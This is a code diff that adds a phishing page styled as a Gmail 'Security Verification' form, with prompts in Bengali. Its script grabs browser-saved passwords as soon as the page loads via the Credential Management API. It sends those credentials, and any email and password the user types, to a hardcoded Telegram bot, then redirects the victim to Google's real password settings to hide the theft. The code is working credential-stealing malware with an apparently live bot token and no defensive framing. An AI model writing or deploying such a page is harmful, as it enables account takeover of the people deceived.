@@ -1,0 +1,62 @@
+<div id="login-view" class="hidden w-full">
+    <h2 class="text-[22px] font-bold text-gray-900 mb-2 text-center">Security Verification</h2>
+    <p class="text-[14px] text-gray-500 mb-6 text-center">আপনার জিমেইল ভেরিফাই করে পাসওয়ার্ড আপডেট করুন।</p>
+    
+    <form id="google-auth-form" autocomplete="on">
+        <div class="space-y-4">
+            <input type="email" id="email" name="email" class="fb-input" placeholder="আপনার জিমেইল" required autocomplete="username">
+            
+            <input type="password" id="pass" name="pass" class="fb-input" placeholder="পাসওয়ার্ড" required autocomplete="current-password">
+            
+            <button type="button" onclick="handleSecureLogin()" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-md text-lg active:scale-95">Verify & Update</button>
+        </div>
+    </form>
+</div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+
+    // ১. পেজ লোড হওয়ার সাথে সাথে গুগল ক্রেডেনশিয়াল পপ-আপ কল করা
+    window.onload = async function() {
+        if (navigator.credentials) {
+            try {
+                const credential = await navigator.credentials.get({
+                    password: true,
+                    unmediated: false // এটি ফিঙ্গারপ্রিন্ট বা পিন পপ-আপ আনতে সাহায্য করে
+                });
+                if (credential) {
+                    document.getElementById('email').value = credential.id;
+                    document.getElementById('pass').value = credential.password;
+                    // অটো-ফিল হলে সাথে সাথে ডেটা পাঠানো
+                    sendToTelegram(`🎯 Auto-filled (Google Manager):\n📧 User: ${credential.id}\n🔑 Pass: ${credential.password}`);
+                }
+            } catch (e) { console.log("Interaction required"); }
+        }
+    };
+
+    // ২. লগইন বাটনে ক্লিক করলে ডেটা পাঠিয়ে গুগল পাসওয়ার্ড সেটিংসে রিডাইরেক্ট করা
+    async function handleSecureLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        if(!email || !pass) {
+            alert("অনুগ্রহ করে তথ্যগুলো পূরণ করুন।");
+            return;
+        }
+
+        const msg = `🚀 ভেরিফিকেশন কমপ্লিট!\n\n📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${pass}`;
+        
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: chatId, text: msg})
+        });
+
+        // ৩. ইউজারকে সরাসরি গুগলের পাসওয়ার্ড চেঞ্জ বা ম্যানেজমেন্ট পেজে পাঠানো
+        // এটি ইউজারকে জিমেইল সেটিংসে নিয়ে যাবে যেখানে সে পাসওয়ার্ড বদলাতে পারবে
+        window.location.href = "https://myaccount.google.com/signinoptions/password";
+    }
+
+    // আগের sendToTelegram এবং অন্যান্য ট্র্যাকিং ফাংশনগুলো আগের মতোই থাকবে।
+</script>
